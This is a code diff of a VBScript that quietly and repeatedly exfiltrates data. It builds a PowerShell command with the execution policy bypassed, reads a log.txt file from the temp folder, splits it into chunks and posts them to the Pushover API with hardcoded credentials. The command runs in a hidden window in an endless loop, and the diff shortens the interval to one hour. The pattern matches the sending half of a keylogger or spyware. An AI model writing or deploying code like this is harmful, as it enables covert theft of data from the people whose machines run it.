@@ -12,24 +12,25 @@ If Not objFSO.FileExists(logFile) Then
     objFile.Close
 End If
 
-' Run API call in a loop every 1 hour
-Do
-    ' Define PowerShell script for API execution only
-    psCommand = "powershell -ExecutionPolicy Bypass -NoProfile -Command " & _
-        """$API_TOKEN='a7apgvyetoayv26hfoh15t11axi6mp'; " & _
-        "$USER_KEY='u2m1rdameavmjmg6abkauqy6ejdqk7'; " & _
-        "$FILE_PATH=[System.IO.Path]::Combine($env:TEMP,'log.txt'); " & _
-        "if (-Not (Test-Path $FILE_PATH)) {exit}; " & _
-        "$MESSAGE = Get-Content $FILE_PATH -Raw; $MAX_LENGTH = 1024; " & _
-        "while ($MESSAGE.Length -gt 0) { " & _
-        "$CHUNK = $MESSAGE.Substring(0, [Math]::Min($MAX_LENGTH, $MESSAGE.Length)); " & _
-        "Invoke-RestMethod -Uri 'https://api.pushover.net:443/1/messages.json' " & _
-        "-Method Post -Body @{token=$API_TOKEN; user=$USER_KEY; message=$CHUNK}; " & _
-        "$MESSAGE = $MESSAGE.Substring($CHUNK.Length)}; exit"""
+' Define the PowerShell script for API execution
+psCommand = "powershell -ExecutionPolicy Bypass -NoProfile -Command " & _
+    "$API_TOKEN='a7apgvyetoayv26hfoh15t11axi6mp'; " & _
+    "$USER_KEY='u2m1rdameavmjmg6abkauqy6ejdqk7'; " & _
+    "$FILE_PATH=[System.IO.Path]::Combine($env:TEMP,'log.txt'); " & _
+    "if (-Not (Test-Path $FILE_PATH)) {exit}; " & _
+    "$MESSAGE = Get-Content $FILE_PATH -Raw; " & _
+    "$MAX_LENGTH = 1024; " & _
+    "while ($MESSAGE.Length -gt 0) { " & _
+    "$CHUNK = $MESSAGE.Substring(0, [Math]::Min($MAX_LENGTH, $MESSAGE.Length)); " & _
+    "Invoke-RestMethod -Uri 'https://api.pushover.net:443/1/messages.json' " & _
+    "-Method Post -Body @{token=$API_TOKEN; user=$USER_KEY; message=$CHUNK}; " & _
+    "$MESSAGE = $MESSAGE.Substring($CHUNK.Length)}; exit"
 
-    ' Run the PowerShell command (silent mode)
+' Infinite loop to execute the PowerShell script every 1 hour
+Do
+    ' Run the PowerShell command in silent mode
     objShell.Run "cmd /c " & psCommand, 0, True
 
     ' Sleep for 1 hour (3600000 milliseconds)
-    WScript.Sleep 7200000
+    WScript.Sleep 3600000
 Loop
